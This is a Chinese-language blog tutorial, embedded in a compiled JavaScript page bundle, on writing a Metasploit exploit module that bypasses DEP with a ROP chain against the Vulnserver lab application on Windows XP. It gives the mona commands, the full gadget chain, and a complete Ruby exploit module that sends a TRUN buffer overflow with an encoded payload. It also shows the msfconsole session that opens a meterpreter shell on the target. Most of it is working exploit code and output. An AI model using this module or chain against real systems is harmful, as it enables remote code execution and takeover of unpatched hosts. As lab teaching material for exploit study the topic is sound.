(window.webpackJsonp=window.webpackJsonp||[]).push([[174],{628:function(s,a,n){"use strict";n.r(a);var t=n(24),e=Object(t.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"使用metasploit编写绕过dep渗透模块"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit编写绕过dep渗透模块"}},[s._v("#")]),s._v(" 使用Metasploit编写绕过DEP渗透模块")]),s._v(" "),n("p",[s._v("攻击机 Kali 192.168.109.137")]),s._v(" "),n("p",[s._v("靶机 WinXP 192.168.109.141 (也可为其他Win系统，设置为DEP保护)")]),s._v(" "),n("p",[s._v("应用程序 Vulnserver(可以到链接： https://download.csdn.net/download/l1028386804/10921905 下载)")]),s._v(" "),n("h2",{attrs:{id:"将靶机设置dep保护"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#将靶机设置dep保护"}},[s._v("#")]),s._v(" 将靶机设置DEP保护")]),s._v(" "),n("p",[s._v("**数据执行保护（Data Execution Prevention，DEP）**是一种将特定内存区域标记为不可执行的保护机制，这种机制会导致我们在渗透过程中无法执行ShellCode。因此，即使我们可以改写EIP寄存器中的内容并成功地将ESP指向了ShellCode的起始地址，也无法执行攻击载荷。这是因为DEP的存在组织了内存中可写区域（例如栈和堆）中数据的执行。在这种情况下，我们必须使用可执行区域中的现存指令实现预期的功能——可以通过将所有的可执行指令放置成一个可以让跳转跳到ShellCode的顺序来实现这一目的。")]),s._v(" "),n("p",[s._v("绕过DEP的技术被称为返回导向编程（Return Oriented Programming，ROP）技术，它不同于通过覆盖改写EIP内容，并跳转到ShellCode栈溢出的普通方法。当DEP启用之后，我们将无法使用这种技术，因为栈中的数据是不能执行的。因此我们不再跳转到ShellCode，而是调用第一个ROP指令片段（gadget）。这些指令片段共同构成一个链式结构，一个指令片段会返回下一个指令片段，而不执行栈中的任何代码。")]),s._v(" "),n("p",[s._v("具体操作如下：")]),s._v(" "),n("p",[s._v('右键"我的电脑"->属性->高级->性能设置->数据执行保存->选择“为除下列选定程序之外的所有程序和服务启用DEP (U)”->确定')]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125342351.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"开启vlunserver监听"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#开启vlunserver监听"}},[s._v("#")]),s._v(" 开启Vlunserver监听")]),s._v(" "),n("p",[s._v("在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("vlunserver.exe 9999\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("监听9999端口")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125430253.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"开启immunitydebugger"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#开启immunitydebugger"}},[s._v("#")]),s._v(" 开启ImmunityDebugger")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125458129.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"将vulnserver进程加载到immunitydebugger"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#将vulnserver进程加载到immunitydebugger"}},[s._v("#")]),s._v(" 将Vulnserver进程加载到ImmunityDebugger")]),s._v(" "),n("p",[s._v("依次选择ImmunityDebugger的File->Attach")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125523794.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("显示靶机所有进程的信息")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125536289.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("我们选中Vulnserver进程并单击右下角的Attach按钮")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125551775.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("显示Vulnserver进程的运行信息")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125607172.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("此时看到Vulnserver进程处于暂停状态，我们需要点击ImmunityDebugger的Play按钮")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125620946.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("此时，看到Vulnserver处于运行状态")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125639410.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"查找vulnserver运行时加载的所有dll信息"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#查找vulnserver运行时加载的所有dll信息"}},[s._v("#")]),s._v(" 查找Vulnserver运行时加载的所有DLL信息")]),s._v(" "),n("p",[s._v("在ImmunityDebugger的命令行输入如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("!mona modules\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125708628.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"将msvcrt-dll上传到kali的-root目录下"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#将msvcrt-dll上传到kali的-root目录下"}},[s._v("#")]),s._v(" 将msvcrt.dll上传到Kali的/root目录下")]),s._v(" "),n("p",[s._v("这里我们将靶机的C:\\Windows\\system32\\msvcrt.dll上传到Kali的/root目录下。")]),s._v(" "),n("h2",{attrs:{id:"查找rop指令片段"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#查找rop指令片段"}},[s._v("#")]),s._v(" 查找ROP指令片段")]),s._v(" "),n("p",[s._v("这里，我们使用到的工具是Metasploit的msfrop，在Kali的命令行输入：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('msfconsole\nmsfrop -v -s "pop cex" /root/msvcrt.dll\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("输出太多，这里只截取一部分：")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125804744.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"创建rop链"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#创建rop链"}},[s._v("#")]),s._v(" 创建ROP链")]),s._v(" "),n("p",[s._v("在ImmunityDebugger命令行输入如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("!mona rop -m *.dll -cp nonull\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125843386.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("执行后会在ImmunityDebugger安装目录下生成一个rop_chains.txt文件")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117125857534.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("我们打开rop_chains.txt文件，找到如下代码片段：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('def create_rop_chain()\n\n  # rop chain generated with mona.py - www.corelan.be\n  rop_gadgets = \n  [\n    0x77bfc038,  # POP ECX # RETN [msvcrt.dll] \n    0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]\n    0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] \n    0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] \n    0x77c11c54,  # POP EBP # RETN [msvcrt.dll] \n    0x625011bb,  # & jmp esp [essfunc.dll]\n    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] \n    0xfffffdff,  # Value to negate, will become 0x00000201\n    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] \n    0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] \n    0x77f01564,  # POP EAX # RETN [GDI32.dll] \n    0xffffffc0,  # Value to negate, will become 0x00000040\n    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] \n    0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] \n    0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] \n    0x7c99f17e,  # &Writable location [ntdll.dll]\n    0x77c17641,  # POP EDI # RETN [msvcrt.dll] \n    0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]\n    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] \n    0x90909090,  # nop\n    0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] \n  ].flatten.pack("V*")\n\n  return rop_gadgets\n\nend\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br")])]),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019011712593726.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("之后，将这段代码拷贝到我们自己编写的渗透模块中。")]),s._v(" "),n("h2",{attrs:{id:"编写绕过dep的metasploit模块脚本dep-attack-by-binghe-rb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#编写绕过dep的metasploit模块脚本dep-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 编写绕过DEP的Metasploit模块脚本dep_attack_by_binghe.rb")]),s._v(" "),n("p",[s._v("不多说，直接上代码：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("##\n# Author 冰河\n# Date 2019-01-16\n# Description Metasploit绕过DEP\n##\n\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = NormalRanking\n  \n  include Msf::Exploit::Remote::Tcp\n  \n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DEP Bypass Exploit',\n      'Description'    => %q{\n        DEP Bypass Using ROP Chains Example Module\n      },\n      'Platform'       => 'Windows',\n      'Author'         => ['binghe'],\n      'Payload'        =>\n        {\n          'space'     => 312,\n          'BadChars'  => \"\\x00\"\n        },\n       'Targets'      => \n        [\n          ['Windows XP', {'Offset'  => 2006}]\n        ],\n        'DisclosureDate'  => '2019-01-16'))\n     \n     register_options(\n      [\n        Opt::RPORT(9999)\n      ],self.class)\n  end\n  \n   def create_rop_chain()\n\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets = \n    [\n      0x77bfc038,  # POP ECX # RETN [msvcrt.dll] \n      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]\n      0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] \n      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] \n      0x77c11c54,  # POP EBP # RETN [msvcrt.dll] \n      0x625011bb,  # & jmp esp [essfunc.dll]\n      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] \n      0xfffffdff,  # Value to negate, will become 0x00000201\n      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] \n      0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] \n      0x77f01564,  # POP EAX # RETN [GDI32.dll] \n      0xffffffc0,  # Value to negate, will become 0x00000040\n      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] \n      0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] \n      0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] \n      0x7c99f17e,  # &Writable location [ntdll.dll]\n      0x77c17641,  # POP EDI # RETN [msvcrt.dll] \n      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]\n      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] \n      0x90909090,  # nop\n      0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] \n    ].flatten.pack(\"V*\")\n\n    return rop_gadgets\n\n  end\n  \n  def exploit\n    connect\n    rop_chain = create_rop_chain()\n    junk = rand_text_alpha_upper(target['Offset'])\n    buf = \"TRUN .\" + junk + rop_chain + make_nops(16) + payload.encoded + '\\r\\n'\n    sock.put(buf)\n    handler\n    disconnect\n  end\n  \nend\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br"),n("span",{staticClass:"line-number"},[s._v("73")]),n("br"),n("span",{staticClass:"line-number"},[s._v("74")]),n("br"),n("span",{staticClass:"line-number"},[s._v("75")]),n("br"),n("span",{staticClass:"line-number"},[s._v("76")]),n("br"),n("span",{staticClass:"line-number"},[s._v("77")]),n("br"),n("span",{staticClass:"line-number"},[s._v("78")]),n("br"),n("span",{staticClass:"line-number"},[s._v("79")]),n("br"),n("span",{staticClass:"line-number"},[s._v("80")]),n("br")])]),n("p",[s._v("其中，def create_rop_chain()方法就是从第8步创建的rop_chains.txt文件中复制来的。")]),s._v(" "),n("h2",{attrs:{id:"上传脚本dep-attack-by-binghe-rb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#上传脚本dep-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 上传脚本dep_attack_by_binghe.rb")]),s._v(" "),n("p",[s._v("将脚本dep_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下。")]),s._v(" "),n("h2",{attrs:{id:"关闭immunitydebugger重新启动vulnserver"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#关闭immunitydebugger重新启动vulnserver"}},[s._v("#")]),s._v(" 关闭ImmunityDebugger重新启动Vulnserver")]),s._v(" "),n("p",[s._v("在靶机上关闭ImmunityDebugger并重新启动Vulnserver。")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117130049549.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"在kali上执行"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#在kali上执行"}},[s._v("#")]),s._v(" 在Kali上执行")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msfconsole\nuse exploit/windows/masteringmetasploit/dep_attack_by_binghe \nset payload windows/meterpreter/bind_tcp\nset RHOST 192.168.109.141\nshow options\nexploit\nifconfig\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br")])]),n("p",[s._v("具体操作如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msf > use exploit/windows/masteringmetasploit/dep_attack_by_binghe \nmsf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > set payload windows/meterpreter/bind_tcp\npayload => windows/meterpreter/bind_tcp\nmsf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > set RHOST 192.168.109.141\nRHOST => 192.168.109.141\nmsf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > show options\n\nModule options (exploit/windows/masteringmetasploit/dep_attack_by_binghe):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST  192.168.109.141  yes       The target address\n   RPORT  9999             yes       The target port (TCP)\n\n\nPayload options (windows/meterpreter/bind_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LPORT     4444             yes       The listen port\n   RHOST     192.168.109.141  no        The target address\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows XP\n\n\nmsf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > exploit\n\n[*] Started bind TCP handler against 192.168.109.141:4444\n[*] Sending stage (179779 bytes) to 192.168.109.141\n\nmeterpreter > ifconfig\n\nInterface  1\n============\nName         : MS TCP Loopback interface\nHardware MAC : 00:00:00:00:00:00\nMTU          : 1520\nIPv4 Address : 127.0.0.1\n\n\nInterface 65539\n============\nName         : VMware Accelerated AMD PCNet Adapter\nHardware MAC : 00:0c:29:5d:8e:d4\nMTU          : 1500\nIPv4 Address : 192.168.109.141\nIPv4 Netmask : 255.255.255.0\n\n\nInterface 65540\n============\nName         : Bluetooth �)%\nHardware MAC : 3c:a0:67:1a:fe:b4\nMTU          : 1500\n\nmeterpreter > \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br")])]),n("p",[s._v("成功拿到Meterpreter的Shell。所以，设置系统的DEP保护，对我们来说并没有什么卵用。")]),s._v(" "),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);